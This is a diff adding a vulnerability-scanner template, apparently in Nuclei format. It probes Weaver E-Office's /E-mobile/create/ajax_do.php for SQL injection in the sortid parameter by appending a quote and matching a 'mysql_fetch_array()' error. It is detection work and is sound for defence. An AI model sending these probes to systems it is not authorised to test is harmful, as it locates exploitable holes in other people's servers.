@@ -1,0 +1,40 @@
+id: poc-yaml-weaver-e-office-ajaxdo-php-sorid-sqli
+info:
+  name: 泛微-EOffice /E-mobile/create/ajax_do.php sortid参数 SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        GET /E-mobile/create/ajax_do.php?diff=addr&sortid=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<div align=\"center\">暂无相关数据...</div>"
+        part: body
+      - type: word
+        words:
+          - "mysql_fetch_array()"
+        part: body
+        negative: true
+  - raw:
+      - |
+        GET /E-mobile/create/ajax_do.php?diff=addr&sortid=1' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "mysql_fetch_array()"
+        part: body
